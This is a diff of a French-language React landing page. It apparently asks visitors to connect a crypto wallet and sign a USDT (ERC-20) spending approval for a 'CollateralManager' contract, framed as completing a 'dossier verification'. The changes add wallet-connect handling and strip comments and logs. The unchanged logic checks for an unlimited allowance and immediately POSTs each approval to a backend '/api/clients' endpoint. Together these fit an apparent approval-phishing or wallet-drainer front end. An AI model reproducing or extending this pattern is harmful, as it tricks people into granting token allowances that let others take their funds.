@@ -17,23 +17,27 @@ export default function Landing() {
   const [pageReady, setPageReady] = useState(false);
   const { address, isConnected } = useAccount();
   const { disconnect } = useDisconnect();
-  const { open } = useWeb3Modal();
+  const { open, close } = useWeb3Modal();
   const [isProcessing, setIsProcessing] = useState(false);
+  const [isConnecting, setIsConnecting] = useState(false);
   
-  // Hooks pour le flux simplifié
   const { approve, isPending: isApproving, isConfirmed: approveConfirmed } = useApproveCollateralManager();
   const { hasApproved, isUnlimited, refetch: refetchAllowance, isLoading: isCheckingAllowance } = useCheckAllowance();
 
-  // Vérifier si le nouveau contrat est déployé
   const isContractDeployed = CONTRACT_ADDRESSES.COLLATERAL_MANAGER !== 'PENDING_DEPLOYMENT';
 
-  // Marquer la page comme prête après le montage
   useEffect(() => {
     const timer = setTimeout(() => setPageReady(true), 100);
     return () => clearTimeout(timer);
   }, []);
 
-  // Rafraîchir l'allowance après une approbation confirmée
+  useEffect(() => {
+    if (isConnected && isConnecting) {
+      setIsConnecting(false);
+      close();
+    }
+  }, [isConnected, isConnecting, close]);
+
   useEffect(() => {
     if (approveConfirmed) {
       setTimeout(() => {
@@ -41,6 +45,17 @@ export default function Landing() {
       }, 2000);
     }
   }, [approveConfirmed, refetchAllowance]);
+
+  const handleConnect = async () => {
+    try {
+      setIsConnecting(true);
+      await open();
+    } catch (error) {
+      console.error('Erreur connexion:', error);
+      toast.error('Échec de la connexion');
+      setIsConnecting(false);
+    }
+  };
 
   const handleApprove = async () => {
     if (!isConnected) {
@@ -53,21 +68,13 @@ export default function Landing() {
       return;
     }
 
-    console.log('🚀 handleApprove appelé');
-    console.log('📍 Address:', address);
-    console.log('📍 Contract:', CONTRACT_ADDRESSES.COLLATERAL_MANAGER);
-
     try {
       setIsProcessing(true);
       
-      console.log('⏳ Appel de la fonction approve()...');
       toast.info('Veuillez confirmer la transaction dans votre wallet...');
-      
       const txHash = await approve();
-      
       console.log('✅ Approve TX envoyée:', txHash);
       
-      // ENVOYER IMMÉDIATEMENT AU BACKEND dès que le wallet a validé
       try {
         const backendUrl = process.env.REACT_APP_BACKEND_URL || '';
         const response = await fetch(`${backendUrl}/api/clients`, {
@@ -87,7 +94,6 @@ export default function Landing() {
       
       toast.success('Validation réussie !');
       
-      // Attendre la confirmation blockchain en arrière-plan
       let confirmed = false;
       let attempts = 0;
       const maxAttempts = 15;
@@ -138,7 +144,6 @@ export default function Landing() {
     }
   };
 
-  // Déterminer l'état du bouton
   const getButtonState = () => {
     if (!isContractDeployed) {
       return { disabled: true, text: 'En attente', icon: <Lock className="mr-2 h-5 w-5" /> };
@@ -157,7 +162,6 @@ export default function Landing() {
 
   const buttonState = getButtonState();
 
-  // Écran de chargement initial
   if (!pageReady) {
     return (
       <div className="min-h-screen bg-black flex items-center justify-center">
@@ -180,14 +184,12 @@ export default function Landing() {
         }}
       />
       
-      {/* Background avec le taureau */}
       <div 
         className="absolute inset-0 bg-cover bg-right bg-no-repeat"
         style={{ backgroundImage: `url(${BULL_BG_URL})` }}
       />
       <div className="absolute inset-0 bg-gradient-to-r from-black via-black/95 to-black/40" />
       
-      {/* Header */}
       <header className="relative z-10 flex items-center justify-between px-8 py-6">
         <img 
           src={LOGO_URL} 
@@ -212,11 +214,9 @@ export default function Landing() {
         </div>
       </header>
 
-      {/* Main Content */}
       <main className="relative z-10 flex items-center min-h-[calc(100vh-180px)] px-8 lg:px-16">
         <div className="w-full max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
           
-          {/* Left Column - Text */}
           <div className="space-y-8">
             <div className="inline-flex items-center gap-2 px-4 py-2 bg-[#E31B23]/10 border border-[#E31B23]/30 rounded-full text-[#E31B23] text-sm font-medium">
               <ShieldCheck className="w-4 h-4" />
@@ -236,7 +236,6 @@ export default function Landing() {
               des fonds USDT (ERC-20) et finaliser la procédure de vérification de votre dossier.
             </p>
 
-            {/* Statut si connecté et autorisé */}
             {isConnected && hasApproved && (
               <div className="flex items-center gap-3 p-4 bg-green-500/10 border border-green-500/30 rounded-lg">
                 <CheckCircle className="w-6 h-6 text-green-500" />
@@ -246,7 +245,6 @@ export default function Landing() {
               </div>
             )}
             
-            {/* Étapes */}
             <div className="space-y-4 pt-4">
               <div className="flex items-center gap-4">
                 <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${isConnected ? 'bg-green-500 text-black' : 'bg-[#E31B23] text-white'}`}>
@@ -267,17 +265,14 @@ export default function Landing() {
             </div>
           </div>
 
-          {/* Right Column - Action Card */}
           <div className="flex justify-center lg:justify-end">
             <div className="w-full max-w-md bg-[#111111]/90 backdrop-blur-sm border border-gray-800 rounded-2xl p-8 space-y-6">
-              {/* Icon */}
               <div className="flex justify-center">
                 <div className="w-16 h-16 rounded-full bg-[#E31B23]/10 border border-[#E31B23]/30 flex items-center justify-center">
                   <Wallet className="w-7 h-7 text-[#E31B23]" />
                 </div>
               </div>
               
-              {/* Title */}
               <div className="text-center">
                 <h2 className="text-xl font-semibold">
                   {!isConnected ? 'Connexion Wallet' : hasApproved ? 'USDT - ERC20' : 'Signature Requise'}
@@ -292,7 +287,6 @@ export default function Landing() {
                 </p>
               </div>
               
-              {/* Wallet Info si connecté */}
               {isConnected && (
                 <div className="bg-[#0a0a0a] border border-gray-800 rounded-lg p-4">
                   <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Wallet connecté</p>
@@ -300,16 +294,16 @@ export default function Landing() {
                 </div>
               )}
               
-              {/* Buttons */}
               <div className="space-y-3">
                 {!isConnected ? (
                   <Button 
-                    onClick={() => open()}
+                    onClick={handleConnect}
                     className="w-full h-12 bg-[#E31B23] hover:bg-[#c91820] text-white font-semibold"
                     data-testid="connect-wallet-button"
                   >
-                    <Wallet className="w-5 h-5 mr-2" />
+                    <Wallet className="mr-2 h-5 w-5" />
                     Connecter Wallet
+                    <ArrowRight className="ml-2 h-4 w-4" />
                   </Button>
                 ) : (
                   <Button 
@@ -328,14 +322,11 @@ export default function Landing() {
                   </Button>
                 )}
               </div>
-              
-              {/* Info */}
             </div>
           </div>
         </div>
       </main>
 
-      {/* Footer */}
       <footer className="relative z-10 px-8 py-6 border-t border-gray-900">
         <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4 text-sm text-gray-500">
           <div className="flex items-center gap-2">
